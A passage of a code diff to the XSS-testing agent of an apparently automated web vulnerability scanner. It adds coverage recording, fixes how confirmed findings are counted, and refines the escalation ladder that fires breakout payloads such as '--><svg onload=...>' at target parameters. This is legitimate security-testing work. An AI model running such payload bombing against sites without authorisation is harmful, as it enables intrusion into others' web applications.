             dry_list = self._fallback_fingerprint_dedup(expanded_wet_findings)
         self._dry_findings = dry_list
         logger.info(f"[{self.name}] Phase A: {len(expanded_wet_findings)} WET → {len(dry_list)} DRY ({len(expanded_wet_findings)-len(dry_list)} duplicates removed)")
@@ -3669,6 +5762,7 @@ Return ONLY the payloads, one per line, no explanations."""
                     "param_source": wf.get("param_source", ""),
                     "form_enctype": wf.get("form_enctype", ""),
                     "form_action": wf.get("form_action", ""),
+                    "context": canonical_probe_context(wf.get("probe_context", "")),
                 }
             for df in dry_list:
                 key = (df.get("url", ""), df.get("parameter", ""))
@@ -3681,6 +5775,17 @@ Return ONLY the payloads, one per line, no explanations."""
                     df["form_enctype"] = wet_meta.get("form_enctype", "")
                 if not df.get("form_action"):
                     df["form_action"] = wet_meta.get("form_action", "")
+                # A MEASUREMENT overwrites the model's answer, it does not merely fill a
+                # blank. The dedup prompt asks the LLM for `context` and it has replied
+                # "html" on every record ever written, so a fill-if-empty rule would never
+                # fire once. Only a real probe label wins; "" leaves the LLM's value alone.
+                measured_context = wet_meta.get("context", "")
+                if measured_context and df.get("context") != measured_context:
+                    logger.debug(
+                        f"[{self.name}] dry context for '{df.get('parameter')}': "
+                        f"{df.get('context')!r} (LLM) -> {measured_context!r} (probe)"
+                    )
+                    df["context"] = measured_context
 
             logger.info(f"[{self.name}] LLM deduplication: {dry_data.get('reasoning', 'No reasoning provided')}")
             return dry_list
@@ -3923,12 +6028,15 @@ Return ONLY the payloads, one per line, no explanations."""
                             "context": result.context,
                             "evidence": {"validated": True, "level": result.evidence.get("level", "unknown")}
                         }
-                        self._emit_xss_finding(
+                        emitted = self._emit_xss_finding(
                             finding_dict,
                             status=result.status or ValidationStatus.VALIDATED_CONFIRMED.value,
                             needs_cdp=needs_cdp
                         )
-                        logger.info(f"[{self.name}] ✅ Emitted XSS: {self.url}?{param_name} (level: {result.evidence.get('level', '?')}, context: {result.context or 'html'})")
+                        if emitted:
+                            logger.info(f"[{self.name}] ✅ Emitted XSS: {self.url}?{param_name} (level: {result.evidence.get('level', '?')}, context: {result.context or 'html'})")
+                        else:
+                            logger.warning(f"[{self.name}] ⚠️  XSS NOT emitted (rejected by _validate_before_emit): {self.url}?{param_name} (level: {result.evidence.get('level', '?')}) — finding still reaches the report via the specialist results file, but never the event bus")
                         if hasattr(self, '_v'):
                             self._v.emit("exploit.xss.confirmed", {"param": param_name, "url": self.url, "level": result.evidence.get("level", "unknown"), "context": result.context or "html", "payload": result.payload[:80]})
                 if hasattr(self, '_v'):
@@ -3937,6 +6045,10 @@ Return ONLY the payloads, one per line, no explanations."""
                 logger.error(f"[{self.name}] Phase B [{idx}/{len(self._dry_findings)}]: {e}")
         logger.info(f"[{self.name}] Phase B complete: {len(validated)} validated")
         self.url = _scan_root_url  # restore: loop above mutated self.url to the last DRY finding
+
+        # NEGATIVE EVIDENCE: written here, before Phase B.2/B.3, so a later phase raising
+        # cannot take the record of what Phase B actually did down with it.
+        self._write_xss_coverage()
 
         # Phase B.2: DOM XSS testing (Playwright) - tests self.url + discovered internal URLs
         try:
@@ -3983,13 +6095,16 @@ Return ONLY the payloads, one per line, no explanations."""
                             "context": "dom_xss",
                             "evidence": evidence
                         }
-                        self._emit_xss_finding(
+                        emitted = self._emit_xss_finding(
                             finding_dict,
                             status=f.status or ValidationStatus.VALIDATED_CONFIRMED.value,
                             needs_cdp=False
                         )
                         validated.append(f)
-                        logger.info(f"[{self.name}] Emitted DOM XSS: {f.url} (source: {f.parameter})")
+                        if emitted:
+                            logger.info(f"[{self.name}] Emitted DOM XSS: {f.url} (source: {f.parameter})")
+                        else:
+                            logger.warning(f"[{self.name}] ⚠️  DOM XSS NOT emitted (rejected by _validate_before_emit): {f.url} (source: {f.parameter})")
         except Exception as e:
             logger.error(f"[{self.name}] Phase B.2 DOM XSS testing failed: {e}", exc_info=True)
 
@@ -4001,9 +6116,12 @@ Return ONLY the payloads, one per line, no explanations."""
                     fp = self._generate_xss_fingerprint(f["url"], f["parameter"], "stored_xss")
                     if fp not in self._emitted_findings:
                         self._emitted_findings.add(fp)
-                        self._emit_xss_finding(f, status=ValidationStatus.VALIDATED_CONFIRMED.value)
+                        emitted = self._emit_xss_finding(f, status=ValidationStatus.VALIDATED_CONFIRMED.value)
                         validated.append(f)
-                        logger.info(f"[{self.name}] Emitted Stored XSS: {f['url']} via {f['parameter']}")
+                        if emitted:
+                            logger.info(f"[{self.name}] Emitted Stored XSS: {f['url']} via {f['parameter']}")
+                        else:
+                            logger.warning(f"[{self.name}] ⚠️  Stored XSS NOT emitted (rejected by _validate_before_emit): {f['url']} via {f['parameter']}")
         except Exception as e:
             logger.error(f"[{self.name}] Phase B.3 Stored XSS testing failed: {e}", exc_info=True)
 
@@ -4439,7 +6557,7 @@ Return ONLY the payloads, one per line, no explanations."""
         return finding
 
     def _browser_only_candidate(
-        self, param: str, context: str, reflecting_payloads: list
+        self, param: str, contexts: Union[str, Iterable[str], None], reflecting_payloads: list
     ) -> bool:
         """Whether an XSS candidate can be confirmed ONLY in a real browser.
 
@@ -4451,15 +6569,140 @@ Return ONLY the payloads, one per line, no explanations."""
         Signals (both require that something reflected, else there is nothing to validate):
           - the parameter is a known redirect/DOM-sink param (reuses the OpenRedirect
             vocabulary, exact match — DRY), or
-          - the reflection landed in a browser-only context (href / url / DOM sink).
+          - ANY of the contexts the reflection landed in is browser-only (href / url / DOM
+            sink). `contexts` is the whole SET, not the ranked winner: url_context sits 8th
+            of 9 in _CONTEXT_EXPLOITABILITY, so a value echoed into an <a href> AND into the
+            body ranks as html_text and the ranked label alone would keep this hatch shut
+            for every parameter whose NAME is not in the redirect vocabulary. Re-ranking
+            would change payload selection everywhere; taking the set here does not.
         """
         if not reflecting_payloads:
             return False
         if (param or "").lower() in _REDIRECT_PARAM_SET:
             return True
-        return (context or "").lower() in _BROWSER_ONLY_CONTEXTS
+        return bool(_as_context_set(contexts) & _BROWSER_ONLY_CONTEXTS)
+
+    # ===== NEGATIVE-EVIDENCE RECORDING =====
+    # Thin adapters over the pure bugtrace.agents.xss.coverage transitions. Each one is a
+    # no-op when no record is open, so the ladder never has to guard its own instrumentation
+    # and coverage can never abort a scan.
+
+    def _cov_probe(self, probe: str, reflected: Optional[bool],
+                   surviving_chars: Optional[str] = None) -> None:
+        """Record a probe string that was SENT and whether its marker came back."""
+        if getattr(self, "_xss_cov", None) is not None:
+            self._xss_cov = xss_coverage.with_probe(
+                self._xss_cov, probe, reflected, surviving_chars
+            )
+
+    def _cov_level(self, level: str, reflected: Optional[int] = None,
+                   confirmed: bool = False, contexts: Optional[Iterable[str]] = None,
+                   final_context: Optional[str] = None, note: str = "") -> None:
+        """Record that a rung RAN, with what it measured."""
+        if getattr(self, "_xss_cov", None) is None:
+            return
+        cov = xss_coverage.with_level(
+            self._xss_cov, level, reflected=reflected, confirmed=confirmed, note=note
+        )
+        cov = xss_coverage.with_contexts(cov, contexts)
+        if final_context and final_context not in ("unknown", "none", "blocked"):
+            cov = xss_coverage.with_final_context(cov, final_context)
+        self._xss_cov = cov
+
+    def _cov_note(self, note: str) -> None:
+        """Record a rung that was deliberately NOT run, and why."""
+        if getattr(self, "_xss_cov", None) is not None:
+            self._xss_cov = xss_coverage.with_note(self._xss_cov, note)
+
+    def _cov_exit(self, reason: str) -> None:
+        """Close the open record at a pipeline exit."""
+        if getattr(self, "_xss_cov", None) is not None:
+            self._xss_cov = xss_coverage.finish(self._xss_cov, reason)
+
+    def _write_xss_coverage(self) -> Optional[Path]:
+        """Persist the per-parameter coverage artifact. Diagnostics — never a finding.
+
+        Deliberately NOT written into specialists/{results,dry,wet} (four generic loaders
+        ingest every dict there as a FINDING) nor as specialists/*_report.json
+        (reporting.py globs that), and never at the reports ROOT, which is what
+        self.report_dir defaults to before the team injects the real scan directory.
+        """
+        if not settings.XSS_COVERAGE_ENABLED or not getattr(self, "_xss_coverage", None):
+            return None
+        path = xss_coverage.resolve_coverage_path(
+            getattr(self, "report_dir", None),
+            settings.REPORT_DIR,
+            settings.XSS_COVERAGE_SUBDIR,
+            settings.XSS_COVERAGE_FILENAME,
+        )
+        if path is None:
+            logger.warning(
+                f"[{self.name}] XSS coverage NOT written: report_dir "
+                f"{getattr(self, 'report_dir', None)!r} + subdir "
+                f"{settings.XSS_COVERAGE_SUBDIR!r} is not a safe location "
+                f"({len(self._xss_coverage)} parameter records dropped)"
+            )
+            return None
+        document = xss_coverage.build_document(
+            self._xss_coverage,
+            scan_url=getattr(self, "url", "") or "",
+            max_params=settings.XSS_COVERAGE_MAX_PARAMS,
+        )
+        if document["truncated"]:
+            logger.warning(
+                f"[{self.name}] XSS coverage truncated: kept "
+                f"{document['params_recorded']} of {document['params_total']} parameter "
+                f"records (XSS_COVERAGE_MAX_PARAMS={settings.XSS_COVERAGE_MAX_PARAMS})"
+            )
+        written = xss_coverage.write_coverage_document(path, document)
+        if written is None:
+            logger.warning(f"[{self.name}] XSS coverage write failed: {path}")
+            return None
+        s = document["summary"]
+        logger.info(
+            f"[{self.name}] XSS coverage: {s['params_tested']} params — "
+            f"{s['confirmed']} confirmed, {s['reflected_but_unconfirmed']} reflected but "
+            f"unconfirmed, {s['no_reflection']} no reflection, {s['no_response']} no "
+            f"response → {written}"
+        )
+        return written
 
     async def _xss_escalation_pipeline(
+        self, url: str, param: str, interactsh_url: str, screenshots_dir: Path,
+        context: str = "html", probe_snippet: str = "",
+        http_method: str = "GET"
+    ) -> Optional[XSSFinding]:
+        """Run the escalation ladder and record NEGATIVE EVIDENCE for this parameter.
+
+        The ladder returns the same ``None`` for "tested hard, nothing executable" and for
+        "never tested". This wrapper guarantees exactly ONE coverage record per call, on
+        EVERY exit — including the exception path, which is an exit too: the record is closed
+        before the exception is re-raised to the caller's ``except``.
+        """
+        # getattr, not attribute access: an XSSAgent built with __new__ (harnesses, some
+        # reject-path shells) has no __init__ state, and an AttributeError raised in the
+        # finally: below would MASK the ladder's real exception.
+        if not isinstance(getattr(self, "_xss_coverage", None), list):
+            self._xss_coverage = []
+        self._xss_cov = xss_coverage.start_coverage(
+            url, param, http_method=http_method, initial_context=context
+        )
+        try:
+            return await self._xss_escalation_ladder(
+                url, param, interactsh_url, screenshots_dir,
+                context=context, probe_snippet=probe_snippet, http_method=http_method,
+            )
+        except Exception as e:
+            self._xss_cov = xss_coverage.finish(
+                self._xss_cov, xss_coverage.EXIT_EXCEPTION
+            )
+            logger.debug(f"[{self.name}] Coverage: '{param}' exited via exception: {e}")
+            raise
+        finally:
+            self._xss_coverage.append(self._xss_cov)
+            self._xss_cov = None
+
+    async def _xss_escalation_ladder(
         self, url: str, param: str, interactsh_url: str, screenshots_dir: Path,
         context: str = "html", probe_snippet: str = "",
         http_method: str = "GET"
@@ -4476,6 +6719,7 @@ Return ONLY the payloads, one per line, no explanations."""
         L6: CDP Validation     → Flag for AgenticValidator
         """
         self._current_http_method = http_method  # Used by _send_payload()
+        self._surviving_chars = ""  # Set by L0.5 char probe, read by L3 breakout selection
         reflecting_payloads = []  # Payloads that reflect but aren't confirmed - passed to L5/L6
 
         def _tag_method(finding):
@@ -4488,15 +6732,33 @@ Return ONLY the payloads, one per line, no explanations."""
         dashboard.log(f"[{self.name}] L0.5: Smart probe on '{param}' (context: {context})", "INFO")
         if hasattr(self, '_v'):
             self._v.emit("exploit.xss.level.started", {"level": "L0.5", "param": param, "context": context})
-        smart_result, reflects, smart_ctx = await self._escalation_l05_smart_probe(url, param, context)
+        smart_result, reflects, smart_ctx, smart_ctxs, probe_status = await self._escalation_l05_smart_probe(url, param, context)
+        # Every context seen by ANY rung, kept unranked. The depth gate below asks this set
+        # — not the single ranked label — whether the browser rungs must run anyway.
+        observed_contexts = set(_as_context_set(smart_ctxs))
+        # surviving_chars is only a MEASUREMENT when the marker came back; when it did not,
+        # self._surviving_chars is still the "" this method initialised, and reporting that
+        # as "no characters survived" would be a claim the probe never made.
+        self._cov_probe(_L05_CHAR_PROBE, reflects,
+                        self._surviving_chars if reflects else None)
+        self._cov_level("L0.5", confirmed=bool(smart_result and smart_result.validated),
+                        contexts=smart_ctxs, final_context=smart_ctx)
         if hasattr(self, '_v'):
             self._v.emit("exploit.xss.probe.result", {"param": param, "reflects": reflects, "context": smart_ctx or context})
             self._v.emit("exploit.xss.level.completed", {"level": "L0.5", "param": param, "confirmed": bool(smart_result and smart_result.validated)})
         if smart_result and smart_result.validated:
             smart_result = await self._try_early_l5_validation(smart_result, url, param, [], screenshots_dir)
+            self._cov_exit(xss_coverage.EXIT_CONFIRMED)
             return _tag_method(smart_result)
         if not reflects:
+            # NOT "0 of N reflected": at this exit the reflecting list is empty BY
+            # CONSTRUCTION — the bombing rungs never ran. The record says "not reached".
+            reason = (
+                xss_coverage.EXIT_NO_RESPONSE if probe_status == _PROBE_NO_RESPONSE
+                else xss_coverage.EXIT_NO_REFLECTION
+            )
             dashboard.log(f"[{self.name}] Smart probe: no reflection for '{param}', skipping all levels", "INFO")
+            self._cov_exit(reason)
             return None
         if smart_ctx and smart_ctx not in ("unknown", "none", "blocked"):
             context = smart_ctx
@@ -4505,11 +6767,16 @@ Return ONLY the payloads, one per line, no explanations."""
         dashboard.log(f"[{self.name}] L1: Polyglot probe on '{param}' (context: {context})", "INFO")
         if hasattr(self, '_v'):
             self._v.emit("exploit.xss.level.started", {"level": "L1", "param": param, "context": context})
-        result, detected_context, l1_snippet = await self._escalation_l1_polyglot(url, param, interactsh_url, context)
+        result, detected_context, l1_snippet, l1_ctxs = await self._escalation_l1_polyglot(url, param, interactsh_url, context)
+        observed_contexts |= _as_context_set(l1_ctxs)
+        self._cov_probe(settings.OMNI_PROBE_MARKER, None)
+        self._cov_level("L1", confirmed=bool(result and result.validated),
+                        contexts=l1_ctxs, final_context=detected_context)
         if hasattr(self, '_v'):
             self._v.emit("exploit.xss.level.completed", {"level": "L1", "param": param, "confirmed": bool(result and result.validated)})
         if result and result.validated:
             result = await self._try_early_l5_validation(result, url, param, [], screenshots_dir)
+            self._cov_exit(xss_coverage.EXIT_CONFIRMED)
             return _tag_method(result)
         # L1 may refine the context from live response analysis
         if detected_context and detected_context != "html":
@@ -4522,10 +6789,13 @@ Return ONLY the payloads, one per line, no explanations."""
         if hasattr(self, '_v'):
             self._v.emit("exploit.xss.level.started", {"level": "L2", "param": param, "context": context})
         result, l2_reflecting = await self._escalation_l2_static_bombing(url, param, interactsh_url, context)
+        self._cov_level("L2", reflected=len(l2_reflecting),
+                        confirmed=bool(result and result.validated), final_context=context)
         if hasattr(self, '_v'):
             self._v.emit("exploit.xss.level.completed", {"level": "L2", "param": param, "confirmed": bool(result and result.validated), "reflecting": len(l2_reflecting)})
         if result and result.validated:
             result = await self._try_early_l5_validation(result, url, param, l2_reflecting, screenshots_dir)
+            self._cov_exit(xss_coverage.EXIT_CONFIRMED)
             return _tag_method(result)
         reflecting_payloads.extend(l2_reflecting)
 
@@ -4533,11 +6803,13 @@ Return ONLY the payloads, one per line, no explanations."""
         _depth = getattr(self, '_scan_depth', '') or settings.SCAN_DEPTH
         if _depth == "quick":
             logger.info(f"[{self.name}] Quick depth: stopping at L2 for '{param}'")
+            self._cov_exit(xss_coverage.EXIT_DEPTH_QUICK)
             return None
 
         # ===== SKIP L3+L4 if L2 found 0 reflecting payloads =====
         if not reflecting_payloads:
             dashboard.log(f"[{self.name}] L2: 0 reflections, skipping L3+L4 for '{param}'", "INFO")
+            self._cov_note("L3+L4 skipped: 0 reflecting payloads after L2")
         else:
             # ===== L3: BOMBING 2 - LLM PAYLOADS × BREAKOUTS =====
             dashboard.log(f"[{self.name}] L3: LLM bombardment on '{param}' (context: {context})", "INFO")
@@ -4547,9 +6819,12 @@ Return ONLY the payloads, one per line, no explanations."""
                 url, param, interactsh_url, reflecting_payloads,
                 context=context, probe_snippet=probe_snippet
             )
+            self._cov_level("L3", reflected=len(l3_reflecting),
+                            confirmed=bool(result and result.validated))
             if hasattr(self, '_v'):
                 self._v.emit("exploit.xss.level.completed", {"level": "L3", "param": param, "confirmed": bool(result and result.validated), "reflecting": len(l3_reflecting)})
             if result and result.validated:
+                self._cov_exit(xss_coverage.EXIT_CONFIRMED)
                 return _tag_method(result)
             reflecting_payloads.extend(l3_reflecting)
 
@@ -4558,9 +6833,12 @@ Return ONLY the payloads, one per line, no explanations."""
             if hasattr(self, '_v'):
                 self._v.emit("exploit.xss.level.started", {"level": "L4", "param": param})
             result, l4_reflecting = await self._escalation_l4_http_manipulator(url, param)
+            self._cov_level("L4", reflected=len(l4_reflecting),
+                            confirmed=bool(result and result.validated))
             if hasattr(self, '_v'):
                 self._v.emit("exploit.xss.level.completed", {"level": "L4", "param": param, "confirmed": bool(result and result.validated), "reflecting": len(l4_reflecting)})
             if result and result.validated:
+                self._cov_exit(xss_coverage.EXIT_CONFIRMED)
                 return _tag_method(result)
             reflecting_payloads.extend(l4_reflecting)
 
@@ -4571,10 +6849,12 @@ Return ONLY the payloads, one per line, no explanations."""
         #    don't silently lose DOM/interaction XSS at the default depth. ──
         _depth = getattr(self, '_scan_depth', '') or settings.SCAN_DEPTH
         if _depth != "thorough":
-            if self._browser_only_candidate(param, context, reflecting_payloads):
+            if self._browser_only_candidate(param, observed_contexts | {context}, reflecting_payloads):
                 logger.info(f"[{self.name}] {_depth.title()} depth: auto-escalating '{param}' to browser (browser-only XSS vector)")
             else:
                 logger.info(f"[{self.name}] {_depth.title()} depth: skipping browser validation for '{param}'")
+                self._cov_note("L5+L6 skipped: depth is not 'thorough' and no browser-only vector")
+                self._cov_exit(xss_coverage.EXIT_DEPTH_NO_BROWSER)
                 return None
 
         # ===== L5: BROWSER TESTING (Playwright) =====
@@ -4584,12 +6864,18 @@ Return ONLY the payloads, one per line, no explanations."""
             if hasattr(self, '_v'):
                 self._v.emit("exploit.xss.level.started", {"level": "L5", "param": param, "candidates": len(reflecting_payloads)})
             result = await self._escalation_l5_browser(url, param, reflecting_payloads, screenshots_dir)
+            self._cov_level("L5", confirmed=bool(result and result.validated),
+                            note=f"{len(reflecting_payloads)} candidates")
             if hasattr(self, '_v'):
                 self._v.emit("exploit.xss.level.completed", {"level": "L5", "param": param, "confirmed": bool(result and result.validated)})
             if result and result.validated:
+                self._cov_exit(xss_coverage.EXIT_CONFIRMED)
                 return _tag_method(result)
         elif reflecting_payloads and http_method == "POST":
             logger.info(f"[{self.name}] L5: Skipping browser test for POST param '{param}'")
+            self._cov_note("L5 skipped: Playwright cannot submit POST params")
+        else:
+            self._cov_note("L5 skipped: no reflecting payloads to browser-test")
 
         # ===== L6: CDP VALIDATION (AgenticValidator) =====
         if reflecting_payloads:
@@ -4597,12 +6883,17 @@ Return ONLY the payloads, one per line, no explanations."""
             if hasattr(self, '_v'):
                 self._v.emit("exploit.xss.level.started", {"level": "L6", "param": param, "candidates": len(reflecting_payloads)})
             result = await self._escalation_l6_cdp(url, param, reflecting_payloads)
+            self._cov_level("L6", note=f"{len(reflecting_payloads)} candidates flagged" if result else "")
             if hasattr(self, '_v'):
                 self._v.emit("exploit.xss.level.completed", {"level": "L6", "param": param, "flagged": bool(result)})
             if result:
+                self._cov_exit(xss_coverage.EXIT_FLAGGED_CDP)
                 return _tag_method(result)
+        else:
+            self._cov_note("L6 skipped: no reflecting payloads to flag for CDP")
 
         dashboard.log(f"[{self.name}] All 6 levels exhausted for '{param}', no XSS confirmed", "WARN")
+        self._cov_exit(xss_coverage.EXIT_EXHAUSTED)
         return None
 
     # ===== ESCALATION LEVEL IMPLEMENTATIONS =====
@@ -4615,7 +6906,14 @@ Return ONLY the payloads, one per line, no explanations."""
         try 3-5 targeted payloads based on what survives.
 
         Returns:
-            (XSSFinding or None, reflects: bool, detected_context: str or None)
+            (XSSFinding or None, reflects: bool, detected_context: str or None,
+             detected_contexts: list of EVERY context the probe reflected in,
+             probe_status: one of _PROBE_NO_RESPONSE / _PROBE_NO_REFLECTION / _PROBE_REFLECTED)
+
+        probe_status exists because "the target answered nothing" and "the target answered
+        without the marker" are opposite facts about the SCAN, and the caller has to be able
+        to say which one it observed. Collapsing both into reflects=False is what made the
+        pipeline unable to distinguish a dead target from a non-injectable parameter.
         """
         # Send char-testing probe with interleaved sub-markers.
         # Each special char is bracketed by its own unique marker pair so its
@@ -4632,10 +6930,13 @@ Return ONLY the payloads, one per line, no explanations."""
             ('`',  'E', 'F'),
             ('\\', 'F', 'G'),
         ]
-        probe = 'BT7331A"BT7331B\'BT7331C<BT7331D>BT7331E`BT7331F\\BT7331G'
+        probe = _L05_CHAR_PROBE
         response = await self._send_payload(param, probe)
-        if not response or "BT7331" not in response:
-            return None, False, None
+        if not response:
+            # _send_payload returns "" on transport failure — no answer at all.
+            return None, False, None, [], _PROBE_NO_RESPONSE
+        if _LEGACY_PROBE_MARKER not in response:
+            return None, False, None, [], _PROBE_NO_REFLECTION
 
         # Each char survives only if its exact bracketed substring is in the response.
         surviving = ""
@@ -4646,6 +6947,12 @@ Return ONLY the payloads, one per line, no explanations."""
         # Detect context via existing analysis
         reflection_info = self._analyze_reflection_context(response, "BT7331")
         detected_context = reflection_info.get("context", initial_context)
+        detected_contexts = list(reflection_info.get("contexts") or [])
+
+        # Share what the char probe proved with the later levels (same per-param,
+        # sequential convention as _current_http_method): L3 uses it to pick
+        # context-appropriate breakouts instead of the globally-ranked list alone.
+        self._surviving_chars = surviving
 
         dashboard.log(
             f"[{self.name}] Smart probe: '{param}' reflects, "
@@ -4658,19 +6965,22 @@ Return ONLY the payloads, one per line, no explanations."""
         if detected_context == "script":
             smart.append(self.SMART_PAYLOADS["js_sq_breakout"])
             smart.append(self.SMART_PAYLOADS["js_dq_breakout"])
-        elif detected_context == "attribute_value":
+        elif detected_context in ("attribute_value", "event_handler"):
             if '"' in surviving:
                 smart.append(self.SMART_PAYLOADS["attr_dq_breakout"])
+                smart.append(self.SMART_PAYLOADS["attr_dq_tag_breakout"])
             if "'" in surviving:
                 smart.append(self.SMART_PAYLOADS["attr_sq_breakout"])
+                smart.append(self.SMART_PAYLOADS["attr_sq_tag_breakout"])
             if '<' in surviving:
                 smart.append(self.SMART_PAYLOADS["html_svg"])
-        elif detected_context in ("html_text", "unknown"):
+        elif detected_context in ("html_text", "raw_text", "unknown"):
             if '<' in surviving:
                 smart.append(self.SMART_PAYLOADS["html_svg"])
                 smart.append(self.SMART_PAYLOADS["html_img"])
             if '"' in surviving:
                 smart.append(self.SMART_PAYLOADS["attr_dq_breakout"])
+                smart.append(self.SMART_PAYLOADS["attr_dq_tag_breakout"])
         elif detected_context == "comment":
             smart.append("--><svg onload=document.title=document.domain>")
 
@@ -4678,11 +6988,12 @@ Return ONLY the payloads, one per line, no explanations."""
         if '<' in surviving and self.SMART_PAYLOADS["script_breakout"] not in smart:
             smart.append(self.SMART_PAYLOADS["script_breakout"])
 
-        # Dedupe and limit to 5
-        smart = list(dict.fromkeys(smart))[:5]
+        # Dedupe and cap. Cap raised 5 → 7 so the tag-closing '">' candidates are ADDED,
+        # never at the cost of dropping a payload that was already being tried.
+        smart = list(dict.fromkeys(smart))[:7]
 
         if not smart:
-            return None, True, detected_context
+            return None, True, detected_context, detected_contexts, _PROBE_REFLECTED
 
         # Test smart payloads
         dashboard.log(
@@ -4710,9 +7021,9 @@ Return ONLY the payloads, one per line, no explanations."""
                         validated=True,
                     )
                     finding.successful_payloads = [payload]
-                    return finding, True, detected_context
+                    return finding, True, detected_context, detected_contexts, _PROBE_REFLECTED
 
-        return None, True, detected_context
+        return None, True, detected_context, detected_contexts, _PROBE_REFLECTED
 
     async def _escalation_l1_polyglot(
         self, url: str, param: str, interactsh_url: str, initial_context: str = "html"
@@ -4721,28 +7032,34 @@ Return ONLY the payloads, one per line, no explanations."""
         L1: Send polyglot/omniprobe, check HTTP reflection.
 
         Returns:
-            (XSSFinding or None, detected_context, html_snippet)
+            (XSSFinding or None, detected_context, html_snippet, detected_contexts)
             - detected_context: refined context from live response analysis
             - html_snippet: HTML around the reflection point for L3 LLM
+            - detected_contexts: EVERY context the marker reflected in, unranked
         """
         probe = settings.OMNI_PROBE_MARKER
         response = await self._send_payload(param, probe)
         if not response:
-            return None, initial_context, ""
+            return None, initial_context, "", []
 
         # Check if probe reflects at all
         if probe not in response:
             logger.info(f"[{self.name}] L1: No reflection for '{param}'")
-            return None, initial_context, ""
+            return None, initial_context, "", []
 
         # Analyze reflection context from live response
         detected_context = initial_context
         html_snippet = ""
+        detected_contexts = []
         try:
-            reflection = self._analyze_reflection_context(response, probe)
+            # marker=probe: this call site holds a REAL marker (OMNI_PROBE_MARKER), unlike
+            # the payload-passing call sites, so it must not fall back to the legacy
+            # hardcoded one — that is what made every L1 context "none".
+            reflection = self._analyze_reflection_context(response, probe, marker=probe)
             if reflection:
                 detected_context = reflection.get("context", initial_context)
-                html_snippet = reflection.get("snippet", "")[:500]
+                detected_contexts = list(reflection.get("contexts") or [])
+                html_snippet = (reflection.get("snippet") or "")[:500]
                 if detected_context != initial_context:
                     logger.info(
                         f"[{self.name}] L1: Context refined: {initial_context} → {detected_context}"
@@ -4757,7 +7074,7 @@ Return ONLY the payloads, one per line, no explanations."""
                 url=url, parameter=param, payload=probe, context=evidence.get("execution_context", "html"),
                 validation_method="L1_polyglot", evidence={**evidence, "level": "L1"},
                 confidence=0.85, status="VALIDATED_CONFIRMED", validated=True
-            ), detected_context, html_snippet
+            ), detected_context, html_snippet, detected_contexts
 
         # Check Interactsh OOB
         if self.interactsh:
@@ -4770,12 +7087,12 @@ Return ONLY the payloads, one per line, no explanations."""
                         url=url, parameter=param, payload=probe, context="oob",
                         validation_method="L1_interactsh", evidence={"oob": True, "level": "L1"},
                         confidence=1.0, status="VALIDATED_CONFIRMED", validated=True
-                    ), detected_context, html_snippet
+                    ), detected_context, html_snippet, detected_contexts
             except Exception:
                 pass
 
         logger.info(f"[{self.name}] L1: Probe reflects but not confirmed for '{param}' (context: {detected_context})")
-        return None, detected_context, html_snippet
+        return None, detected_context, html_snippet, detected_contexts
 
     async def _ensure_go_bridge(self) -> bool:
         """Lazy-initialize Go bridge for L2 acceleration. Returns True if available."""
@@ -5048,7 +7365,7 @@ Return ONLY the payloads, one per line, no explanations."""
         self, url: str, param: str, interactsh_url: str, existing_reflecting: list,
         context: str = "html", probe_snippet: str = ""
     ) -> tuple:
-        """L3: Generate 100 LLM payloads, multiply by breakouts, fire via HTTP."""
+        """L3: Generate LLM payloads (max 10), multiply by breakouts, fire via HTTP."""
         # Use context from L1 analysis, or analyze from existing reflections
         sample_context = context if context != "html" else "html"
         html_snippet = probe_snippet
@@ -5075,15 +7392,29 @@ Return ONLY the payloads, one per line, no explanations."""
             logger.info(f"[{self.name}] L3: LLM generated 0 payloads, skipping")
             return None, []
 
-        # Multiply by breakouts from breakout_manager
+        # Multiply by breakouts. get_top_breakouts() ranks by global success_count ALONE —
+        # no context filter, no surviving-chars filter — so a breakout that actually fits
+        # the detected context (e.g. '">' for a double-quoted attribute) can sit outside
+        # the limit and never be tried. Union it with the prefixes the shared context
+        # table prescribes for this context (single source of truth:
+        # tools/manipulator/context_analyzer.CONTEXT_BREAKOUTS) and drop empty prefixes,
+        # which only duplicate the base payload. The union is ADDITIVE in BOTH directions:
+        # every globally ranked prefix survives it (see merge_breakout_prefixes) and
+        # `sample_context` — which may be an LLM-invented label, not this agent's
+        # reflection vocabulary — can only widen the set, never narrow it.
         from bugtrace.tools.manipulator.breakout_manager import breakout_manager
-        breakouts = breakout_manager.get_top_breakouts(limit=10)
-        breakout_prefixes = [b.prefix for b in breakouts if b.prefix]
+        surviving = getattr(self, "_surviving_chars", "")
+        breakout_prefixes = merge_breakout_prefixes(
+            context_breakout_prefixes(sample_context, surviving),
+            [b.prefix for b in breakout_manager.get_top_breakouts(limit=10)],
+        )
 
-        amplified = []
+        # Deterministic tag-closing candidates first: L3 otherwise only ever fires what the
+        # LLM invented, so the '"><svg onload=...>' family could stay unreachable.
+        amplified = tag_closing_breakout_payloads(sample_context, surviving, self.SMART_PAYLOADS)
         for vp in visual_payloads:
             amplified.append(vp)  # Base payload
-            for prefix in breakout_prefixes[:10]:  # Top 10 breakouts
+            for prefix in breakout_prefixes:
                 amplified.append(prefix + vp)
 
         logger.info(f"[{self.name}] L3: Bombing {len(amplified)} LLM×breakout payloads on '{param}'")
@@ -5355,9 +7686,12 @@ Return ONLY the payloads, one per line, no explanations."""
 
         results = await self.exploit_dry_list()
 
-        # Count confirmed vulnerabilities
+        # Count confirmed vulnerabilities.
+        # `_dry_findings` is the list of CANDIDATES queued for testing, NOT confirmations —
+        # folding it into this counter reported "4 vulns" on scans that found 0 XSS, and
+        # painted the XSS node red in SwarmGraph. Keep the two numbers separate.
         vulns_count = len([r for r in results if r]) if results else 0
-        vulns_count += len(self._dry_findings) if hasattr(self, '_dry_findings') else 0
+        candidates_count = len(self._dry_findings) if hasattr(self, '_dry_findings') else 0
 
         if results or self._dry_findings:
             # v3.2: Convert XSSFinding dataclasses to dicts for JSON serialization
@@ -5371,8 +7705,10 @@ Return ONLY the payloads, one per line, no explanations."""
             processed=len(dry_list),
             vulns=vulns_count
         )
-        self._v.emit("exploit.xss.completed", {"processed": len(dry_list), "vulns": vulns_count})
-        logger.info(f"[{self.name}] Queue consumer complete: {len(results)} validated findings")
+        self._v.emit("exploit.xss.completed", {
+            "processed": len(dry_list), "vulns": vulns_count, "candidates": candidates_count,
+        })
+        logger.info(f"[{self.name}] Queue consumer complete: {vulns_count} confirmed findings from {candidates_count} candidates")
 
     async def _load_xss_tech_context(self) -> None:
         """
@@ -5410,17 +7746,25 @@ Return ONLY the payloads, one per line, no explanations."""
 
     async def stop_queue_consumer(self) -> None:
         """Stop queue consumer mode gracefully."""
-        if self._worker_pool:
